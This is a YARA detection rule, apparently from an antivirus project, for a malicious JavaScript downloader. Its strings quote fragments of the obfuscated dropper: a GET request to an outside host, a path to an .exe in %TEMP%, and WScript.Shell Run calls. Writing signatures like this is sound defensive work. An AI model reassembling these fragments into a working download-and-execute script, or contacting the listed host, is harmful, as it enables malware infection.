rule sig_20160329_0dfa9e8af45d9fb716dfecae3f972bbd {
  meta:
    description = "datamaliciousorder - file 20160329_0dfa9e8af45d9fb716dfecae3f972bbd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "118c2a14e640e476ee4da75e5a8123f3a5c384235fa3bd0629099f364d032408"

  strings:
    $s1  = "function Jzzqg() {return Ddokaxy[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"2t3QnE4jj7.exe\";};" fullword ascii
    $s2  = "Qubajetizg[Ifjpsfalh](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Xjowwmft](Mzhgcox() * 11)} while (Qubajetizg[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Ddokaxy = function Txnsclxy() {return WScript[Yjddtxv](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Pitwnogubx(Joqqs, Mguqewaamd){return Joqqs - Mguqewaamd;};" fullword ascii
    $s6  = "function Ufwihtpin() {return ((Ijafkdwh == true) && (Ijafkdwh == Sxwvd)) ? 1 : Eblsloorea;};" fullword ascii
    $s7  = "function Gayrj(Pmmdmui){Ddokaxy[\"Run\"](Pmmdmui, Eblsloorea, Eblsloorea);};" fullword ascii
    $s8  = "var Rtovgj = new this[\"Date\"]();" fullword ascii
    $s9  = "function Uqknjbbqd(){return Yjddtxv;};" fullword ascii
    $s10 = "function Mzhgcox(){return 22;};" fullword ascii
    $s11 = "var Umjymozazf = false;" fullword ascii
    $s12 = "var Sxwvd = false;" fullword ascii
    $s13 = " while (Pexpliax){" fullword ascii
    $s14 = "function Owltbxuf()" fullword ascii
    $s15 = "function Zbwmoryc(Ossnehu) {var Ilucmerjx = (1, 2, 3, 4, 5, Ossnehu); return Ilucmerjx;};" fullword ascii
    $s16 = "Ijafkdwh = true; " fullword ascii
    $s17 = "return Pitwnogubx(Mppiy, Lbcvxltib);" fullword ascii
    $s18 = "var Ijafkdwh = false;" fullword ascii
    $s19 = "Sxwvd = true; " fullword ascii
    $s20 = "} catch(Aqhwiudxsi){Pexpliax = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}